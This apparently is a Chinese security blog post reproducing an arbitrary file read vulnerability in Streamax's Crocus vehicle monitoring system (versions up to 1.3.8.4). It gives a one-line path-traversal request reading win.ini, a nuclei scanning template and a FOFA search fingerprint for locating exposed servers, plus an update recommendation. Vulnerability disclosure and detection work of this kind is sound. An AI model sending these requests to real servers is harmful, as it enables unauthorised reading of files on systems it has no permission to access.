#  【漏洞复现】锐明Crocus系统存在任意文件读取漏洞   
PokerSec  PokerSec   2025-02-05 01:00  
  
**先关注，不迷路，成为你渗透大师路上的王牌.**  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 漏洞介绍  
  
      深圳市锐明技术股份有限公司锐明技术Crocus系统融合了锐明技术的多项核心技术，如视频图像处理技术、卫星定位、物联网传感器、车载电子工程及无线通讯等，旨在为用户提供系统化、智能化的商用车监控和信息化解决方案。锐明Crocus系统存在任意文件读取漏洞，攻击者可以通过该漏洞绕过应用的文件访问控制，访问到应用根目录之外的文件。  
## 影响范围  
  
 <=1.3.8.4  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKZd2WlYFqUUWvbb0oT4zI78AtMzfqW5c4yZTDpSKoqJ62CwgibWnX96vByxomDbyefUTj39DAfauw/640?wx_fmt=png&from=appmsg "")  
  
POC:  
  
(这微信页面直接复制代码格式会乱，可以浏览器打开复制)  
```
/Service.do?Action=Download&Path=C:/windows/win.ini
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKZd2WlYFqUUWvbb0oT4zI7euDZdXic3QibWHwwdaVPVJSLMGSTSsibeiaKPVictQp1r4lqaDgsgoticX2A/640?wx_fmt=png&from=appmsg "")  
## nuclei脚本  
```
id: streamax-Crocus-download-download

info:
  name: streamax-Crocus-download-download
  author: PokerSec
  severity: high
  metadata:
    fofasearch: body="inp_verification"

http:
  - raw:
      - |
        GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"[mci extensions]") && contains_all(body,"[extensions]")
```  
## 修复意见  
  
请及时更新最新版本：https://www.streamax.com/  
  
  
  
如有侵权，请及时联系删除。  
  
  
